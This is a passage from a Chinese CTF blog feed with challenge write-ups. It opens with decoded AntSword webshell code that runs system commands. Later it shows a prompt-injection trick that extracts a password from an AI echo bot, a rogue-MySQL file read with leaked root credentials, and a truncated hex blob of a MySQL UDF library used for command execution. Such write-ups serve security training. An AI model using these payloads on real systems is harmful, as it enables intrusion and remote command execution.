&#123;</span><br><span class=\"line\">\t\t\tprint(@shell_exec($c));</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;exec&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@exec($c,$o,$ret);</span><br><span class=\"line\">\t\t\tprint(join(&quot;</span><br><span class=\"line\">&quot;,$o));</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;popen&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t$fp=@popen($c,&#x27;r&#x27;);</span><br><span class=\"line\">\t\t\twhile(!@feof($fp)) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($fp,2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t@pclose($fp);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;proc_open&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t$p = @proc_open($c, array(1 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;), 2 =&gt; array(&#x27;pipe&#x27;, &#x27;w&#x27;)), $io);</span><br><span class=\"line\">\t\t\twhile(!@feof($io[1])) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($io[1],2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\twhile(!@feof($io[2])) &#123;</span><br><span class=\"line\">\t\t\t\tprint(@fgets($io[2],2048));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t@fclose($io[1]);</span><br><span class=\"line\">\t\t\t@fclose($io[2]);</span><br><span class=\"line\">\t\t\t@proc_close($p);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;antsystem&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@antsystem($c);</span><br><span class=\"line\">\t\t&#125; elseif(runshellshock($d, $c)) &#123;</span><br><span class=\"line\">\t\t\treturn $ret;</span><br><span class=\"line\">\t\t&#125; elseif(substr($d,0,1)!=&quot;/&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123;</span><br><span class=\"line\">\t\t\t$w=new COM(&#x27;WScript.shell&#x27;);</span><br><span class=\"line\">\t\t\t$e=$w-&gt;exec($c);</span><br><span class=\"line\">\t\t\t$so=$e-&gt;StdOut();</span><br><span class=\"line\">\t\t\t$ret.=$so-&gt;ReadAll();</span><br><span class=\"line\">\t\t\t$se=$e-&gt;StdErr();</span><br><span class=\"line\">\t\t\t$ret.=$se-&gt;ReadAll();</span><br><span class=\"line\">\t\t\tprint($ret);</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t$ret = 127;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn $ret;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\t$ret=@runcmd($r.&quot; 2&gt;&amp;1&quot;);</span><br><span class=\"line\">\tprint ($ret!=0)?&quot;ret=&#123;$ret&#125;&quot;:&quot;&quot;;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">catch(Exception $e) &#123;</span><br><span class=\"line\">\techo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">asoutput();</span><br><span class=\"line\">die();</span><br></pre></td></tr></table></figure>\n<p>当查看这一串的 base64 解码的内容时</p>\n<blockquote>\n<p>这串内容可能出现在整体代码的前面，也可能能出现在整体代码的后端<br>\n尝试了几次，发现是这样的，但是具体原因还不太清楚</p>\n</blockquote>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hdQWdF5Rrl5BEMAR.png!thumbnail\" alt=\"\"></p>\n<p>能发现我们之前输入的最后一行 cat flag.php 命令</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/e5o5xZjl0cwyKaJ3.png!thumbnail\" alt=\"\"></p>\n<p>根据这个再去 http 流的最后一个追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ItR2SF2XaVYginww.png!thumbnail\" alt=\"\"></p>\n<p>解码这段 base64 就能看到 cat flag.php 的具体内容了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ATJitJGKzlDQFCbK.png!thumbnail\" alt=\"\"></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91C0deX%E6%88%98%E9%98%9FWP/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91C0deX%E6%88%98%E9%98%9FWP/",
            "title": "西湖论剑C0deX战队WP",
            "date_published": "2024-04-16T05:58:19.059Z",
            "content_html": "<h1 id=\"西湖论剑c0dex战队wp\"><a class=\"markdownIt-Anchor\" href=\"#西湖论剑c0dex战队wp\">#</a> 西湖论剑 C0deX 战队 WP</h1>\n<h3 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc</h3>\n<h4 id=\"2024签到题\"><a class=\"markdownIt-Anchor\" href=\"#2024签到题\">#</a> 2024 签到题</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131103436990.png\" alt=\"\"></p>\n<p>根据附件中图片的详细信息发送文字到公众号获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131103550962.png\" alt=\"\"></p>\n<p><strong>DASCTF{gcsis_2024_we_are_ready}</strong></p>\n<h4 id=\"数据安全-easy_tables\"><a class=\"markdownIt-Anchor\" href=\"#数据安全-easy_tables\">#</a> 数据安全 - easy_tables</h4>\n<p>附件得到四张表，大致看了下 pdf 中的说明，大致意思就是需要用前三张表也就是 user、permission、tables 获得每个用户所属组的可工作时间段和可以执行的操作，根据 actionlog 表获得具体工作的时间和实际执行的操作，对照知道哪些进行了违规操作，将每个表中的编号按顺序排列之后的 md5 便是最终 flag</p>\n<p>看了下 actionlog 表发现数据很多，通过脚本进行处理并且筛选出不符合规定的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import re</span><br><span class=\"line\">from datetime import datetime</span><br><span class=\"line\"></span><br><span class=\"line\">class LogProcessor:</span><br><span class=\"line\">    def __init__(self, users_file=&#x27;users.csv&#x27;, actions_file=&#x27;actionlog.csv&#x27;, tables_file=&#x27;tables.csv&#x27;, permissions_file=&#x27;permissions.csv&#x27;):</span><br><span class=\"line\">        self.users_file = users_file</span><br><span class=\"line\">        self.actions_file = actions_file</span><br><span class=\"line\">        self.tables_file = tables_file</span><br><span class=\"line\">        self.permissions_file = permissions_file</span><br><span class=\"line\"></span><br><span class=\"line\">        self.users, self.user_dict = self.extract_user_list()</span><br><span class=\"line\">        self.action_logs = self.extract_actions()</span><br><span class=\"line\">        self.tables, self.table_dict = self.extract_tables()</span><br><span class=\"line\">        self.permissions_list = self.extract_permissions()</span><br><span class=\"line\"></span><br><span class=\"line\">    def is_time_in_ranges(self, time_str, time_ranges):</span><br><span class=\"line\">        target_time = datetime.strptime(time_str, &#x27;%H:%M:%S&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        for range_str in time_ranges:</span><br><span class=\"line\">            start_time, end_time = map(lambda x: datetime.strptime(x, &#x27;%H:%M:%S&#x27;), range_str.split(&#x27;~&#x27;))</span><br><span class=\"line\">            if start_time &lt;= target_time &lt;= end_time:</span><br><span class=\"line\">                return True</span><br><span class=\"line\"></span><br><span class=\"line\">        return False</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_sql_operation_type(self, sql_statement):</span><br><span class=\"line\">        pattern = re.compile(r&#x27;\\b(insert|delete|update|select)\\b&#x27;, re.IGNORECASE)</span><br><span class=\"line\">        match = pattern.search(sql_statement)</span><br><span class=\"line\"></span><br><span class=\"line\">        if match:</span><br><span class=\"line\">            return match.group(1).upper()</span><br><span class=\"line\"></span><br><span class=\"line\">        return None</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_table_name_from_sql(self, sql_statement):</span><br><span class=\"line\">        pattern = re.compile(r&#x27;\\bFROM\\b\\s+([^\\s;]+)|\\bJOIN\\b\\s+([^\\s;]+)|\\bUPDATE\\b\\s+([^\\s;]+)|\\bINTO\\b\\s+([^\\s;]+)|\\bMERGE\\b\\s+([^\\s;]+)|\\bTABLE\\b\\s+([^\\s;]+)&#x27;, re.IGNORECASE)</span><br><span class=\"line\">        match = pattern.search(sql_statement)</span><br><span class=\"line\"></span><br><span class=\"line\">        if match:</span><br><span class=\"line\">            return next(group for group in match.groups() if group is not None)</span><br><span class=\"line\"></span><br><span class=\"line\">        return None</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_user_list(self):</span><br><span class=\"line\">        user_file = open(self.users_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        content = user_file.read()</span><br><span class=\"line\">        users_list = list()</span><br><span class=\"line\">        user_dict = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        rows = content.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        for row in rows:</span><br><span class=\"line\">            user_info = row.split(&#x27;,&#x27;)</span><br><span class=\"line\">            users_list.append(row.split(&#x27;,&#x27;))</span><br><span class=\"line\">            user_dict[user_info[1]] = int(user_info[0])</span><br><span class=\"line\"></span><br><span class=\"line\">        return users_list, user_dict</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_actions(self):</span><br><span class=\"line\">        action_log_file = open(self.actions_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        line = action_log_file.read()</span><br><span class=\"line\">        log_lines = line.split(&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        return log_lines</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_tables(self):</span><br><span class=\"line\">        tables_file = open(self.tables_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        content = tables_file.read()</span><br><span class=\"line\">        tables_list = list()</span><br><span class=\"line\">        table_dict = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        rows = content.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        for row in rows:</span><br><span class=\"line\">            table_info = row.split(&#x27;,&#x27;)</span><br><span class=\"line\">            tables_list.append(row.split(&#x27;,&#x27;))</span><br><span class=\"line\">            table_dict[table_info[1]] = int(table_info[0])</span><br><span class=\"line\"></span><br><span class=\"line\">        return tables_list, table_dict</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_permissions(self):</span><br><span class=\"line\">        permissions_file = open(self.permissions_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        line = permissions_file.read()</span><br><span class=\"line\">        lines = line.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        permissions_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">        for line in lines:</span><br><span class=\"line\">            pattern = re.compile(r&#x27;(\\w+),(\\w+),(&quot;.*?&quot;|[^,]+),(&quot;.*?&quot;|[^,]+)&#x27;)</span><br><span class=\"line\">            matches = pattern.match(line)</span><br><span class=\"line\"></span><br><span class=\"line\">            if matches:</span><br><span class=\"line\">                group1 = matches.group(1)</span><br><span class=\"line\">                group2 = matches.group(2)</span><br><span class=\"line\"></span><br><span class=\"line\">                operations_str = matches.group(3)</span><br><span class=\"line\">                operations_list = operations_str.strip(&#x27;\\&quot;&#x27;).split(&#x27;,&#x27;) if &#x27;\\&quot;&#x27; in operations_str else [operations_str]</span><br><span class=\"line\"></span><br><span class=\"line\">                numbers_str = matches.group(4)</span><br><span class=\"line\">                numbers_list = numbers_str.strip(&#x27;\\&quot;&#x27;).split(&#x27;,&#x27;) if &#x27;\\&quot;&#x27; in numbers_str else [numbers_str]</span><br><span class=\"line\"></span><br><span class=\"line\">                permissions_list.append([group1, group2, operations_list, numbers_list])</span><br><span class=\"line\"></span><br><span class=\"line\">        return permissions_list</span><br><span class=\"line\"></span><br><span class=\"line\">    def process_actions(self):</span><br><span class=\"line\">        result_flags = []</span><br><span class=\"line\"></span><br><span class=\"line\">        for logline in self.action_logs:</span><br><span class=\"line\">            values = logline.split(&#x27;,&#x27;, 3)</span><br><span class=\"line\">            if values[1] in self.user_dict.keys():</span><br><span class=\"line\">                tuser = self.users[self.user_dict[values[1]] - 1]</span><br><span class=\"line\">                tpermissions = self.permissions_list[int(tuser[3]) - 1]</span><br><span class=\"line\">                sql_head = tpermissions[2]</span><br><span class=\"line\">                table_pass = tpermissions[3]</span><br><span class=\"line\"></span><br><span class=\"line\">                table_name = self.extract_table_name_from_sql(values[3])</span><br><span class=\"line\">                ttable = self.tables[self.table_dict[table_name] - 1]</span><br><span class=\"line\"></span><br><span class=\"line\">                if str(self.table_dict[table_name]) in table_pass:</span><br><span class=\"line\">                    sql_type = self.extract_sql_operation_type(values[3]).lower()</span><br><span class=\"line\">                    if sql_type in sql_head:</span><br><span class=\"line\">                        time_ranges = [item.replace(&#x27;&quot;&#x27;, &#x27;&#x27;) for item in ttable[2:]]</span><br><span class=\"line\">                        datetime_object = datetime.strptime(values[2], &#x27;%Y/%m/%d %H:%M:%S&#x27;)</span><br><span class=\"line\">                        time_only = datetime_object.time()</span><br><span class=\"line\"></span><br><span class=\"line\">                        if self.is_time_in_ranges(str(time_only), time_ranges):</span><br><span class=\"line\">                            pass</span><br><span class=\"line\">                        else:</span><br><span class=\"line\">                            son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                            result_flags.append(son)</span><br><span class=\"line\">                    else:</span><br><span class=\"line\">                        son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                        result_flags.append(son)</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                    result_flags.append(son)</span><br><span class=\"line\">                ttable = self.tables[self.table_dict[table_name] - 1]</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                son = &#x27;0_0_0_&#x27; + values[0]</span><br><span class=\"line\">                result_flags.append(son)</span><br><span class=\"line\"></span><br><span class=\"line\">        return result_flags</span><br><span class=\"line\"></span><br><span class=\"line\">    def custom_sort(self, item):</span><br><span class=\"line\">        p = item.split(&#x27;_&#x27;)</span><br><span class=\"line\">        return tuple(map(int, p))</span><br><span class=\"line\"></span><br><span class=\"line\">    def print_sorted_list(self, sorted_list):</span><br><span class=\"line\">        for i in sorted_list:</span><br><span class=\"line\">            print(i, end=&#x27;&#x27;)</span><br><span class=\"line\">            print(&#x27;,&#x27;, end=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def main(self):</span><br><span class=\"line\">        result_flags = self.process_actions()</span><br><span class=\"line\"></span><br><span class=\"line\">        sorted_list = sorted(result_flags, key=self.custom_sort)</span><br><span class=\"line\">        self.print_sorted_list(sorted_list)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    log_processor = LogProcessor()</span><br><span class=\"line\">    log_processor.main()</span><br></pre></td></tr></table></figure>\n<p>将每个表格中的表头去除运行脚本进行处理得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0_0_0_6810,0_0_0_8377,6_14_91_6786,7_64_69_3448,9_18_61_5681,30_87_36_235,31_76_85_9617,49_37_30_8295,75_15_43_8461,79_3_15_9011</span><br></pre></td></tr></table></figure>\n<p>md5 之后得到 flag</p>\n<p><strong>271b1ffebf7a76080c7a6e134ae4c929</strong></p>\n<h4 id=\"easy_rawraw\"><a class=\"markdownIt-Anchor\" href=\"#easy_rawraw\">#</a> easy_rawraw</h4>\n<p>得到附件，一个加密压缩包，一个内存 raw 文件，需要进行取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131112328731.png\" alt=\"\"></p>\n<p>首先 passware 爆破得到用户密码 das123admin321，发现不是压缩包密码，利用 vol 对 raw 文件进行取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131112840314.png\" alt=\"\"></p>\n<p>filescan 过滤 zip 得到了 pass.zip，dump 下来爆破压缩包密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113001517.png\" alt=\"\"></p>\n<p>解开得到都是 md5 的密码本，最终利用 winhex 直接对 raw 文件进行搜索得到了压缩包密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113231879.png\" alt=\"\"></p>\n<p>DasrIa456sAdmIn987，后续发现可以 strings 进行 grep 更快一些</p>\n<p>解压出来 veracrypt 进行挂载，密码本作为 keyfile</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113636740.png\" alt=\"\"></p>\n<p>用户密码 das123admin321 作为解开表格的密码</p>\n<p>搜索 DAS 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113748604.png\" alt=\"\"></p>\n<p><strong>DASCTF{5476d4c4ade0918c151aa6dcac12d130}</strong></p>\n<h3 id=\"ai\"><a class=\"markdownIt-Anchor\" href=\"#ai\">#</a> AI</h3>\n<h4 id=\"ai-回声海螺\"><a class=\"markdownIt-Anchor\" href=\"#ai-回声海螺\">#</a> AI - 回声海螺</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114007683.png\" alt=\"\"></p>\n<p>发现输入框有点眼熟，尝试输入一些字，发现会有三遍的回声</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114145572.png\" alt=\"\"></p>\n<p>尝试一下模板注入带出 password</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131115329843.png\" alt=\"\"></p>\n<p>在几次尝试之后得到了密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131115405274.png\" alt=\"\"></p>\n<p>由于是复现环境，所以并没有弹窗出 flag，在比赛期间弹窗得到 flag</p>\n<h3 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h3>\n<h4 id=\"0r1cle\"><a class=\"markdownIt-Anchor\" href=\"#0r1cle\">#</a> 0r1cle</h4>\n<p>非预期，在输入 65 个左右的 0 之后获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114633396.png\" alt=\"\"></p>\n<h3 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h3>\n<h4 id=\"only_sql\"><a class=\"markdownIt-Anchor\" href=\"#only_sql\">#</a> only_sql</h4>\n<p>使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2MwY2MvZmFrZU15c2FsL2Jsb2IvbWFzdGVyL2Zha2VNeXNxbFNlcnZlci5weQ==\"> https://github.com/c0cc/fakeMysal/blob/master/fakeMysqlServer.py</span> 配合 vps 读源码，拿到账密和数据库连接即可 root：1q2w3e4r5t!@#</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706594062001-fe3a09c2-c4fa-4ef4-970d-ab5d211bf405.png\" alt=\"\" title=\"fig:\">执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select unhex(&#x27;7f454c4602010100000000000000000003003e0001000000a00b0000000000004000000000000000882c0000000000000000000040003800070040001c001b000100000005000000000000000000000000000000000000000000000000000000d416000000000000d41600000000000000002000000000000100000006000000101e000000000000101e200000000000101e2000000000007802000000000000800200000000000000002000000000000200000006000000201e000000000000201e200000000000201e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e574640400000004140000000000000414000000000000041400000000000094000000000000009400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000101e000000000000101e200000000000101e200000000000f001000000000000f0010000000000000100000000000000040000001400000003000000474e55005c08ddf79a6da5143daa80e4a7efb410a96c4a44000000001100000012000000020000000700000080080248811944c91ca440039804688312000000140000001500000017000000180000001a0000001d0000001f000000000000002000000000000000210000002200000023000000240000002500000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed971581ca868be12bbe3927c7e8b92cdc2f9bfba1f7066a9745bb073371974ec4345d5ecc5a62c1cc3138aff3b9fd4a0ad73d1c50b5911feab5fbe1200000000000000000000000000000000000000000000000000000000cd0000001200000000000000000000000000000000000000fe00000012000000000000000000000000000000000000007c0100001200000000000000000000000000000000000000160000002000000000000000000000000000000000000000120100001200000000000000000000000000000000000000d400000012000000000000000000000000000000000000009101000012000000000000000000000000000000000000004001000012000000000000000000000000000000000000008a01000012000000000000000000000000000000000000008401000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000000b0100001200000000000000000000000000000000000000e800000012000000000000000000000000000000000000007401000012000000000000000000000000000000000000006e01000012000000000000000000000000000000000000003200000020000000000000000000000000000000000000004c00000022000000000000000000000000000000000000000301000012000c00fe0f000000000000da000000000000005501000012000c0048120000000000000b000000000000001000000012000d00f81300000000000000000000000000009300000012000c000c0d0000000000006b000000000000002101000012000900900a0000000000000000000000000000b301000010001700882020000000000000000000000000003701000012000c007e110000000000002f00000000000000bf0100001000170090202000000000000000000000000000b600000012000c00080e0000000000000b00000000000000c500000012000c00130e00000000000063000000000000004701000012000c00ad110000000000009b000000000000007600000012000c00010d0000000000000b00000000000000a900000012000c00770d0000000000009100000000000000ac01000010001600882020000000000000000000000000002701000012000c0073110000000000000b00000000000000db00000012000c00760e0000000000005c010000000000001901000012000c00d8100000000000009b000000000000005b00000012000c007a0c0000000000008700000000000000ef00000012000c00d20f0000000000002c000000000000006501000012000c005312000000000000a301000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65006c69625f6d7973716c7564665f7379735f696e666f5f696e6974006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f007379735f6765745f696e6974007379735f6765745f6465696e6974007379735f67657400676574656e76007374726c656e007379735f7365745f696e6974006d616c6c6f63007379735f7365745f6465696e69740066726565007379735f736574006d656d63707900736574656e76007379735f657865635f696e6974007379735f657865635f6465696e6974007379735f657865630073797374656d007379735f6576616c5f696e6974007379735f6576616c5f6465696e6974007379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f7365005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e313400474c4942435f322e3400474c4942435f322e322e3500000000020002000200000002000200030002000200020000000400020002000200000002000100010001000100010001000100010001000100010001000100010001000100010001000100010000000000000001000300a201000010000000000000009491960600000400c4010000100000001469690d00000300cf01000010000000751a690900000200d901000000000000101e2000000000000800000000000000700c000000000000181e2000000000000800000000000000300c000000000000802020000000000008000000000000008020200000000000e01f20000000000006000000040000000000000000000000e81f200000000000060000000b0000000000000000000000f01f20000000000006000000100000000000000000000000f81f200000000000060000001100000000000000000000001820200000000000070000000100000000000000000000002020200000000000070000000200000000000000000000002820200000000000070000000300000000000000000000003020200000000000070000000500000000000000000000003820200000000000070000000600000000000000000000004020200000000000070000000700000000000000000000004820200000000000070000000800000000000000000000005020200000000000070000000900000000000000000000005820200000000000070000000a00000000000000000000006020200000000000070000000c00000000000000000000006820200000000000070000000d00000000000000000000007020200000000000070000000e00000000000000000000007820200000000000070000000f00000000000000000000004883ec08488b054d1520004885c07402ffd04883c408c3000000000000000000ff3552152000ff25541520000f1f4000ff25521520006800000000e9e0ffffffff254a1520006801000000e9d0ffffffff25421520006802000000e9c0ffffffff253a1520006803000000e9b0ffffffff25321520006804000000e9a0ffffffff252a1520006805000000e990ffffffff25221520006806000000e980ffffffff251a1520006807000000e970ffffffff25121520006808000000e960ffffffff250a1520006809000000e950ffffffff2502152000680a000000e940ffffffff25fa142000680b000000e930ffffffff25f2142000680c000000e920ffffffff256214200066900000000000000000488d3de114200055488d05d91420004839f84889e57419488b05221420004885c0740d5dffe0662e0f1f8400000000005dc30f1f4000662e0f1f840000000000488d3da1142000488d359a142000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05e11320004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d5114200000752f48833db713200000554889e5740c488b3d32142000e